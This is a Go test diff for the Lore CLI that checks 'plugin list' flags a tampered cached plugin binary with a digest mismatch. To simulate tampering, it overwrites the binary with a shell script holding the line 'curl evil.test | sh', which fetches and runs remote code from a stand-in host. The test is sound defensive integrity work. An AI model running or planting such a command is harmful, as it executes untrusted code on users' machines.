@@ -2,8 +2,12 @@ package cli
 
 import (
 	"bytes"
+	"os"
+	"path/filepath"
+	"strings"
 	"testing"
 
+	"github.com/setthasit/Lore/internal/plugindist"
 	"github.com/setthasit/Lore/internal/registry"
 	lore "github.com/setthasit/Lore/sdk"
 )
@@ -69,5 +73,37 @@ func TestRenderPluginsOutput(t *testing.T) {
 				t.Errorf("renderPlugins() =\n%q\nwant\n%q", got, test.want)
 			}
 		})
+	}
+}
+
+func TestPluginListReportsATamperedCacheAsTampered(t *testing.T) {
+	fake := newFakeReleases(t)
+	publishPlugin(t, fake, "v0.3.1", pluginStub)
+	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1")+
+		"  - name: crm\n    from: github.com/acme/lore-crm@v2.0.1\n")
+
+	if res := run(t, nil, "plugin", "install", "linear", "--config", path); res.exitCode != exitOK {
+		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
+	}
+
+	binary := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1", pluginBinaryName())
+	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
+		t.Fatalf("rewrite the cached binary: %v", err)
+	}
+
+	res := runOn(t, stubRegistry(t, forgePlugin()), nil, "", "plugin", "list", "--config", path)
+	if res.exitCode != exitOK {
+		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
+	}
+	for _, want := range []string{
+		"digest mismatch", "lore plugin install linear",
+		"not installed — run: lore plugin install crm",
+	} {
+		if !strings.Contains(res.stdout, want) {
+			t.Errorf("stdout %q does not mention %q", res.stdout, want)
+		}
+	}
+	if strings.Contains(res.stdout, "not installed — run: lore plugin install linear") {
+		t.Errorf("stdout %q reports the tampered cache as not installed", res.stdout)
 	}
 }
